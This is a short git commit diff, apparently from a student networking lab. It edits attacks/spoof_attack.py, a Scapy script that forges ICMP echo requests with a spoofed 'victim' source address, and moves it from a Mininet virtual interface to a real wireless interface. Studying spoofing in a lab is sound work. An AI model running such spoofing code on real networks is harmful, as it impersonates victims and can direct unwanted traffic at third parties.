3056dd399fa62b6923962e0583b704139a954acf
shreyaSunanda <2105173@ugrad.cse.buet.ac.bd>
2026-09-19 13:36:20 +0600

    Seperated mininet and real version

--- attacks/spoof_attack.py
+++ attacks/spoof_attack.py
@@ -3,9 +3,9 @@ from scapy.all import IP, ICMP, send
 
 packet = IP(
     src="192.168.10.10",      # victim ip
-    dst="192.168.20.100"      #  Server IP
+    dst="192.168.20.10"      #  Server IP
 ) / ICMP(
     type=8                     # 8 = Echo Request
 )
 
-send(packet, iface="h2-eth0", count=5, verbose=True)
+send(packet, iface="wlp2s0", count=5, verbose=True)
